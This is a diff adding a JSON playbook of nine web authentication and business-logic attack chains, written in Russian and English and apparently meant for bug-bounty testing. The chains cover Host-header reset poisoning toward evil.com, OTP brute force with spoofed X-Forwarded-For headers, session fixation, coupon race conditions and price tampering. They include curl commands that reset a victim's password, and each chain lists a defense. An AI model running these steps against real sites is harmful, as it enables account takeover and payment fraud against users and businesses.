@@ -1,0 +1,518 @@
+{
+  "domain": "Auth",
+  "domainLabel": "Аутентификация / 2FA / логика",
+  "domainOrder": 6,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "Сброс пароля: отравление через заголовок Host",
+      "level": "newbie",
+      "impact": "Полный захват аккаунта через кражу токена сброса жертвы(выше на крупных программах).",
+      "why": "Одна подмена заголовка превращает публичную форму сброса в воровство токена.",
+      "precondition": "Приложение строит ссылку сброса из заголовка запроса (Host / X-Forwarded-Host), и жертва кликнет по ссылке из письма.",
+      "tags": [
+        "password-reset",
+        "host-header",
+        "account-takeover"
+      ],
+      "realWorld": "PortSwigger lab 'Password reset poisoning via middleware'; GHSA-адвизори Kanboard/MasaCMS по Host-header.",
+      "defense": "Строить ссылки из серверного base URL по allowlist; никогда не доверять Host / X-Forwarded-Host.",
+      "steps": [
+        {
+          "title": "Картируем флоу сброса",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "intercept POST /forgot-password with email=you@target.com in Burp; locate the reset link inside the received email"
+        },
+        {
+          "title": "Подменяем заголовок Host",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "change Host: target.com to Host: evil.com, resend, check if the email link host changed (test on your own account first)",
+          "success": "хост ссылки в письме сменился на evil.com"
+        },
+        {
+          "title": "Перебираем варианты заголовков",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "X-Forwarded-Host: evil.com / duplicate Host headers / Host: target.com:80@evil.com / absolute-URI in request line"
+        },
+        {
+          "title": "Фолбэк через dangling-markup",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "when only partly injectable: X-Forwarded-Host: target.com?evil.com so the token rides to you as a query param"
+        },
+        {
+          "title": "Бьём по жертве",
+          "kind": "note",
+          "q": "",
+          "detail": "submit reset for email={USER_B} with the poisoned header; victim now receives a booby-trapped link"
+        },
+        {
+          "title": "Ловим токен",
+          "kind": "script",
+          "q": "OOB HTTP logger (offline, stdlib)",
+          "detail": "run a listener (python3 -m http.server / Burp Collaborator / interactsh) and read the token from the path or Referer when the victim clicks"
+        },
+        {
+          "title": "Захватываем аккаунт",
+          "kind": "note",
+          "detail": "curl -s 'https://target.com/reset-password?token=<captured>' -d 'password=Hacked123!' ; then log in",
+          "success": "200 и вход с новым паролем"
+        }
+      ]
+    },
+    {
+      "title": "Сброс пароля: утечка и предсказуемость токена",
+      "level": "newbie",
+      "impact": "Захват аккаунта, часто без действий жертвы.",
+      "why": "Токен сброса это и есть пароль: если он утёк или предсказуем, аккаунт твой.",
+      "precondition": "Приложение выдаёт токен сброса по email, и ты можешь наблюдать собственный флоу и ответ сброса.",
+      "tags": [
+        "password-reset",
+        "token-leak",
+        "predictable-token",
+        "account-takeover"
+      ],
+      "realWorld": "Общая техника; типовые HackerOne-отчёты ATO через токен сброса; PortSwigger authentication labs.",
+      "defense": "128-битный случайный одноразовый токен, короткий TTL, привязка к аккаунту, плюс Referrer-Policy: no-referrer на странице сброса.",
+      "steps": [
+        {
+          "title": "Смотрим собственный ответ сброса",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "POST /forgot-password, then read the JSON/HTML body and Location header for token / resetToken / code / otp"
+        },
+        {
+          "title": "Токен прямо в теле ответа",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "if the response (or a GET /reset?email= probe) returns the token, request it for the victim's email and read it directly",
+          "success": "token виден в ответе для чужого email"
+        },
+        {
+          "title": "Утечка через Referer",
+          "kind": "note",
+          "q": "",
+          "detail": "open the reset page; if it loads analytics/3rd-party scripts, the token in the URL leaks via the Referer header (check DevTools Network) and lands in their logs"
+        },
+        {
+          "title": "Предсказуемый или последовательный токен",
+          "kind": "note",
+          "detail": "pull several tokens back-to-back, diff them, test UUIDv1 / timestamp / md5(email) / incrementing id, then reproduce the victim's offline"
+        },
+        {
+          "title": "Переиспользование, без срока, без привязки",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "reuse an old token, use it twice, or confirm it is not tied to the requesting session"
+        },
+        {
+          "title": "Манипуляция шагом или ответом",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "skip a multi-step reset straight to POST /reset-password, or flip a verify response {\"otpValid\":false} to true to reach the set-password screen"
+        },
+        {
+          "title": "Ставим пароль жертве",
+          "kind": "note",
+          "detail": "curl -s https://target.com/reset-password -d 'email={USER_B}&token=<derived>&password=Hacked123!'",
+          "success": "200, затем вход"
+        }
+      ]
+    },
+    {
+      "title": "Захват через смену email в профиле",
+      "level": "intermediate",
+      "impact": "Полный захват целевого аккаунта.",
+      "why": "Кто владеет привязанным email, тот владеет любым будущим сбросом, поэтому поле email это настоящая жемчужина.",
+      "precondition": "Приложение позволяет менять email аккаунта при слабой верификации или клиентской проверке.",
+      "tags": [
+        "account-takeover",
+        "email-change",
+        "logic"
+      ],
+      "realWorld": "Общая техника; регулярные HackerOne-отчёты ATO через неверифицированную смену email.",
+      "defense": "Требовать текущий пароль и step-up, слать уведомление и подтверждение на СТАРЫЙ адрес, хранить состояние многошагового флоу на сервере.",
+      "steps": [
+        {
+          "title": "Картируем смену email",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "POST /account/email with email=new@evil.com; note whether it demands the current password or a confirm step"
+        },
+        {
+          "title": "Нет повторной аутентификации",
+          "kind": "note",
+          "q": "",
+          "detail": "change email with no current-password check; chain with CSRF/clickjacking on this endpoint for cross-user impact"
+        },
+        {
+          "title": "Подмена статуса в ответе",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "if a confirm step returns {\"verified\":false} or 403, intercept the response and change it to true / 200 to force-confirm"
+        },
+        {
+          "title": "Пропуск шага подтверждения",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "replay the final success request / POST /account/email/confirm directly without completing email confirmation"
+        },
+        {
+          "title": "Неверифицированный recovery-email",
+          "kind": "note",
+          "q": "",
+          "detail": "if an unverified secondary/recovery email is accepted, add @evil.com as recovery and reset through it"
+        },
+        {
+          "title": "Пивот в полный захват",
+          "kind": "note",
+          "detail": "curl -s https://target.com/forgot-password -d 'email={EMAIL}' ; capture token and log in",
+          "success": "письмо сброса приходит на {EMAIL}"
+        }
+      ]
+    },
+    {
+      "title": "Обход 2FA/OTP на уровне логики",
+      "level": "intermediate",
+      "impact": "Полный обход MFA при наличии украденных или своих кредов.",
+      "why": "Логические дыры в MFA встречаются повсюду и хорошо платят, ведь они ломают последний рубеж защиты.",
+      "precondition": "У тебя валидная пара логин+пароль, и между тобой и аккаунтом стоит запрос 2FA.",
+      "tags": [
+        "2fa",
+        "mfa-bypass",
+        "logic",
+        "account-takeover"
+      ],
+      "realWorld": "PortSwigger labs '2FA simple bypass' и '2FA broken logic'.",
+      "defense": "Проверять 2FA на сервере с привязкой к аутентифицирующей сессии, одноразовые коды, не доверять статусу с клиента.",
+      "steps": [
+        {
+          "title": "Картируем шаг 2FA",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "after the password step capture POST /login2 (mfa-code=) and any identity field like verify= / username="
+        },
+        {
+          "title": "Пропуск самого шага",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "finish the password step, then request a post-2FA page directly (GET /my-account); if it loads, 2FA is not enforced server-side",
+          "success": "GET /my-account открывается без кода"
+        },
+        {
+          "title": "Подмена статуса в ответе",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "submit a wrong code, intercept the response, change {\"success\":false}/401 to true/200 or follow the 302 to the authenticated page"
+        },
+        {
+          "title": "Дыра в привязке к жертве",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "log in with YOUR creds to reach 2FA, then set verify=carlos so a code is issued for the victim, and submit/brute against them"
+        },
+        {
+          "title": "Переиспользование кода",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "reuse a prior valid OTP, or replay the same code across sessions; confirm old codes still verify"
+        },
+        {
+          "title": "Злоупотребление backup-кодами",
+          "kind": "note",
+          "q": "",
+          "detail": "hit /2fa/backup-code with no throttle or short/enumerable codes, or disable 2FA via the recovery flow"
+        },
+        {
+          "title": "Подтверждаем сессию",
+          "kind": "note",
+          "detail": "curl -s https://target.com/my-account -H 'Cookie: session=<post-login>' ; session cookie is now fully privileged",
+          "success": "страница аккаунта отдаётся как залогиненному"
+        }
+      ]
+    },
+    {
+      "title": "Брутфорс OTP через обход rate-limit",
+      "level": "intermediate",
+      "impact": "Подбор OTP 2FA или сброса напрямую к захвату.",
+      "why": "Коды из 4-6 цифр умирают мгновенно, как только сломан троттлинг, поэтому это самый переиспользуемый обход в игре.",
+      "precondition": "Числовой код OTP/2FA/сброса под слабым или обходимым ограничением частоты.",
+      "tags": [
+        "otp",
+        "brute-force",
+        "rate-limit-bypass",
+        "2fa"
+      ],
+      "realWorld": "PortSwigger lab '2FA bypass using a brute-force attack'; классические отчёты обхода rate-limit через X-Forwarded-For.",
+      "defense": "Лимитировать по паре аккаунт+код на сервере (не по IP/заголовку), блокировать после N попыток, протухание и ротация OTP, CAPTCHA.",
+      "steps": [
+        {
+          "title": "Находим троттлинг",
+          "kind": "checklist",
+          "q": "brute-force",
+          "detail": "fire 10-20 wrong codes at POST /verify and watch for 429 / lockout / CAPTCHA; note exactly what trips it"
+        },
+        {
+          "title": "Спуфим IP источника",
+          "kind": "payload",
+          "q": "Brute Force Rate Limit",
+          "detail": "rotate X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / X-Originating-IP per request (1.1.1.1, 1.1.1.2 ...)"
+        },
+        {
+          "title": "Трюки с регистром, кодировкой, путём",
+          "kind": "payload",
+          "q": "Brute Force Rate Limit",
+          "detail": "alter method/path case, add a trailing / or %00 or ?x=1 or change Content-Type to dodge a path-keyed limiter"
+        },
+        {
+          "title": "Сбрасываем счётчик",
+          "kind": "note",
+          "q": "",
+          "detail": "re-request a fresh OTP between batches if the counter resets per code, or null-byte the value as 0000%00"
+        },
+        {
+          "title": "Гонкой обходим лимитер",
+          "kind": "note",
+          "detail": "single-packet 20-30 guesses inside one window (gate='race1') to slip extra attempts past a per-time-window throttle"
+        },
+        {
+          "title": "Брутим через Turbo Intruder",
+          "kind": "script",
+          "q": "otp_brute.py - перебор OTP/2FA с обходом rate-limit",
+          "detail": "iterate 0000-9999 across rotated IPs, concurrentConnections=30, success marker = 302 / Set-Cookie / response-length change"
+        },
+        {
+          "title": "Захватываем",
+          "kind": "note",
+          "detail": "curl -s https://target.com/verify -H 'X-Forwarded-For: 1.2.3.4' -d 'mfa-code=<hit>' ; authenticated session issued",
+          "success": "выдан Set-Cookie / 302 на аккаунт"
+        }
+      ]
+    },
+    {
+      "title": "Гонка на чекауте: купоны и лимиты через single-packet",
+      "level": "intermediate",
+      "impact": "Многократное использование одноразовых купонов/гифткарт, перерасход баланса, обход лимитов на аккаунт; прямые деньги.",
+      "why": "Флагманский денежный баг современности, где параллельные запросы бьют почти любую наивную проверку 'уже использовано?'.",
+      "precondition": "Серверное действие защищено схемой check-then-act над общим состоянием (купон использован? баланс? сток? получено?).",
+      "tags": [
+        "race-condition",
+        "single-packet",
+        "coupon",
+        "business-logic"
+      ],
+      "realWorld": "PortSwigger research 'Smashing the state machine' и 'The single-packet attack' (James Kettle, 2023).",
+      "defense": "Атомарные ограничения БД, SELECT ... FOR UPDATE, уникальный индекс на (coupon,user), idempotency-ключи, никакого check-then-act.",
+      "steps": [
+        {
+          "title": "Находим лимитированное действие",
+          "kind": "checklist",
+          "q": "race-condition",
+          "detail": "one-time coupon POST /cart/coupon code=SAVE90, gift-card redeem, '1 per account' claim, or withdraw/transfer"
+        },
+        {
+          "title": "Базовая одиночная попытка",
+          "kind": "note",
+          "q": "",
+          "detail": "apply once legitimately and confirm the second attempt is rejected ('already used')"
+        },
+        {
+          "title": "Собираем гонку в Repeater",
+          "kind": "payload",
+          "q": "Race Condition",
+          "detail": "add 20-50 identical requests to a tab group and choose 'Send group in parallel (single-packet attack)' over HTTP/2"
+        },
+        {
+          "title": "Вариант через Turbo Intruder",
+          "kind": "note",
+          "detail": "race-single-packet-attack.py: engine.queue(target.req, gate='race1') x30 then engine.openGate('race1')"
+        },
+        {
+          "title": "Читаем перерасход",
+          "kind": "note",
+          "q": "",
+          "detail": "success = coupon applied multiple times / balance reduced once for many redemptions / stock goes negative",
+          "success": "купон применён N раз или сток ушёл в минус"
+        },
+        {
+          "title": "Фиксируем профит",
+          "kind": "note",
+          "detail": "curl ... /checkout after looping the discount to drive cart total toward 0 (or inflate balance)"
+        }
+      ]
+    },
+    {
+      "title": "Манипуляция ценой, количеством, валютой",
+      "level": "newbie",
+      "impact": "Покупка бесплатно или почти даром, либо чеканка стор-кредита через возвраты.",
+      "why": "Изначальная классика бизнес-логики: если цену присылает клиент, цену задаёт клиент.",
+      "precondition": "Корзина, чекаут или API доверяет присланной клиентом цене, количеству или валюте.",
+      "tags": [
+        "business-logic",
+        "price-tampering",
+        "negative-value"
+      ],
+      "realWorld": "Общая техника (OWASP business-logic testing; классические отчёты price-tampering в e-commerce).",
+      "defense": "Считать цену и итог на сервере по product ID, валидировать валюту и отклонять отрицательные количества, игнорировать клиентский итог.",
+      "steps": [
+        {
+          "title": "Снимаем add-to-cart и checkout",
+          "kind": "checklist",
+          "q": "business-logic",
+          "detail": "hunt the body/JSON for price= / amount= / unit_price= / currency= / qty= / total="
+        },
+        {
+          "title": "Подменяем цену",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "set price=1 (or 0.01), proceed to pay, confirm the charged amount equals the tampered value",
+          "success": "списано ровно подменённое значение"
+        },
+        {
+          "title": "Отрицательное количество или значение",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "qty=-1 or amount=-100 to credit yourself or push the total below zero (refund / store-credit abuse)"
+        },
+        {
+          "title": "Подмена валюты",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "change currency=USD to a low-value unit so '100' costs a fraction while goods/credit stay valued in the original"
+        },
+        {
+          "title": "Стэкинг скидок",
+          "kind": "note",
+          "q": "",
+          "detail": "send multiple coupon= params, set percent=100, or re-add a removed discount via a tampered request"
+        },
+        {
+          "title": "Абуз округления и точности",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "tiny decimals (0.000001) or large item counts to exploit float rounding and underpay"
+        },
+        {
+          "title": "Подтверждаем заказ",
+          "kind": "note",
+          "detail": "curl ... /checkout then verify the order total and actual charge reflect the manipulation, not the catalog price"
+        }
+      ]
+    },
+    {
+      "title": "Фиксация сессии: угон аутентифицированной сессии",
+      "level": "intermediate",
+      "impact": "Угон аутентифицированной сессии жертвы.",
+      "why": "Хрестоматийный баг сессий, который до сих пор живёт там, где приложение не ротирует session ID при логине.",
+      "precondition": "Приложение принимает навязанный атакующим session-токен и НЕ перевыпускает его после аутентификации.",
+      "tags": [
+        "session-fixation",
+        "session",
+        "account-takeover"
+      ],
+      "realWorld": "OWASP Session Fixation; материалы PortSwigger по session management.",
+      "defense": "Перевыпускать session ID при каждой смене привилегий (логин), отклонять клиентские ID, ставить HttpOnly/Secure/SameSite.",
+      "steps": [
+        {
+          "title": "Наблюдаем работу с сессией",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "note the cookie (PHPSESSID / JSESSIONID / session) before login and check if its value changes after login"
+        },
+        {
+          "title": "Подтверждаем отсутствие ротации",
+          "kind": "note",
+          "q": "",
+          "detail": "log in; if the pre-login cookie value is still valid afterward, the ID is fixable",
+          "success": "доавторизационное значение cookie остаётся валидным после входа"
+        },
+        {
+          "title": "Получаем известный ID",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "grab an anonymous session, or set one via an accepted param/cookie (?sessionid=ATTACKER)"
+        },
+        {
+          "title": "Навязываем его жертве",
+          "kind": "note",
+          "q": "",
+          "detail": "deliver the fixed session via a crafted link / XSS / Set-Cookie injection so the victim browses with your chosen ID"
+        },
+        {
+          "title": "Жертва аутентифицируется",
+          "kind": "note",
+          "q": "",
+          "detail": "victim logs in under the attacker-known ID, which is now privileged"
+        },
+        {
+          "title": "Едем на её сессии",
+          "kind": "note",
+          "detail": "curl -s https://target.com/my-account -H 'Cookie: session=ATTACKER' ; open as the victim",
+          "success": "контент жертвы под фиксированным ID"
+        }
+      ]
+    },
+    {
+      "title": "Обход верификации email и pre-account-takeover",
+      "level": "newbie",
+      "impact": "Доступ к функциям 'только для верифицированных' или тихий захват аккаунтов, созданных позже.",
+      "why": "Регистрация это самый мягкий вход, а предзахват или самоверификация email тихо компрометируют будущие аккаунты.",
+      "precondition": "Приложение завязывает личность или функции на шаг верификации email, который можно пропустить или опередить.",
+      "tags": [
+        "registration",
+        "email-verification",
+        "pre-account-takeover"
+      ],
+      "realWorld": "Исследование pre-hijacking (Sudhodanan и Paverd, 2022); типовые отчёты обхода верификации email.",
+      "defense": "Требовать верификацию до любого использования аккаунта, атомарная уникальность верифицированного email, канонизация адресов, запрет предзахвата неверифицированных адресов.",
+      "steps": [
+        {
+          "title": "Картируем регистрацию и верификацию",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "POST /register then GET/POST /verify-email?token=; note what 'verified' unlocks"
+        },
+        {
+          "title": "Пропуск верификации",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "log in right after POST /register; if GET /dashboard loads unverified, the gate is client-side only",
+          "success": "GET /dashboard открыт без верификации"
+        },
+        {
+          "title": "Подмена ответа верификации",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "intercept the verify response and change emailVerified:0 / {\"verified\":false} to 1 / true"
+        },
+        {
+          "title": "Самоверификация токена",
+          "kind": "note",
+          "q": "",
+          "detail": "if the verification token is returned in the signup response or is predictable, confirm any email without inbox access"
+        },
+        {
+          "title": "Предзахват email жертвы",
+          "kind": "note",
+          "q": "",
+          "detail": "register {USER_B} (unverified) before they do; when they later sign up or join via SSO/OAuth the app may merge into your account"
+        },
+        {
+          "title": "Путаница через алиасы и регистр",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "register Victim@target.com, victim+x@, or a trailing-space/Unicode variant to collide with the real account on a normalizing backend"
+        },
+        {
+          "title": "Наследуем аккаунт",
+          "kind": "note",
+          "detail": "curl -s https://target.com/login -d 'email={USER_B}&password=<your-original>' after the merge/normalization",
+          "success": "вход в привязанный аккаунт жертвы"
+        }
+      ]
+    }
+  ]
+}
